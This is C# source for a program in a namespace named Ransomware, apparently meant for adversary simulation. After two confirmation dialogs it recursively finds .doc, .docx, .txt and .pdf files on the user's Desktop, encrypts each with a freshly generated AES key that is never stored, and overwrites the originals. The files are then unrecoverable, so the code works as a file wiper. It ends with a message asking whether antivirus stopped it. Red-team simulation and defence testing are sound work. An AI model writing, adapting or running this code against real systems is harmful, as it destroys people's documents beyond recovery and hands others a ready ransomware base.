using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Ransomware
{
    class Program
    {
        static void Main()
        {
            DialogResult dialogResult = MessageBox.Show("WARNING: This is ransomware intended for adversary simulation and will begin encrypting your desktop files. " +
                "Are you sure you want to run this?", "RANSOMWARE WARNING", MessageBoxButtons.YesNo);

            if (dialogResult == DialogResult.Yes)
            {
                DialogResult areYouSure = MessageBox.Show("Are you sure?","RANSOMWARE WARNING", MessageBoxButtons.YesNo);
                if (areYouSure == DialogResult.Yes)
                {
                    //So it begins
                    //Get the current username
                    string user = Environment.UserName;
                    //Get their desktop
                    string targetDir = @"C:\Users\" + user + @"\Desktop\";
                    //Get all their file paths...using Enumerate would be more efficient
                    string[] docFiles = Directory.GetFiles(targetDir, "*.doc", SearchOption.AllDirectories);
                    string[] docxFiles = Directory.GetFiles(targetDir, "*.docx", SearchOption.AllDirectories);
                    string[] textFiles = Directory.GetFiles(targetDir, "*.txt", SearchOption.AllDirectories);
                    string[] pdfFiles = Directory.GetFiles(targetDir, "*.pdf", SearchOption.AllDirectories);
                    string[] targetFilesA = docFiles.Concat(docxFiles).ToArray();
                    string[] targetFilesB = pdfFiles.Concat(textFiles).ToArray();
                    string[] allTargetFiles = targetFilesA.Concat(targetFilesB).ToArray();

                    //ENCRYPT
                    for(int i = 0; i < allTargetFiles.Length; i++)
                    {
                        using (Aes myAes = Aes.Create())
                        {
                            // Encrypt the string to an array of bytes.
                            byte[] encrypted = EncryptStringToBytes_Aes(File.ReadAllText(allTargetFiles[i]), myAes.Key, myAes.IV);
                            string cipherText = Encoding.Default.GetString(encrypted);
                            File.WriteAllText(allTargetFiles[i], cipherText); //Write encrypted bytes to the file
                        }
                    }

                    MessageBox.Show("Your files are encrypted :( Did your anti-virus stop it!?");
                }
                else if (areYouSure == DialogResult.No)
                {
                    System.Environment.Exit(1);
                }
            }
            else if (dialogResult == DialogResult.No)
            {
                System.Environment.Exit(1);
            }
        }

        static byte[] EncryptStringToBytes_Aes(string plainText, byte[] Key, byte[] IV) //https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.aes?view=net-5.0
        {
            if (plainText == null || plainText.Length <= 0)
                throw new ArgumentNullException("plainText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            byte[] encrypted;

            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Key;
                aesAlg.IV = IV;

                ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream msEncrypt = new MemoryStream())
                {
                    using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                    {
                        using (StreamWriter swEncrypt = new StreamWriter(csEncrypt))
                        {
                            swEncrypt.Write(plainText);
                        }
                        encrypted = msEncrypt.ToArray();
                    }
                }
            }
            return encrypted;
        }
    }
}
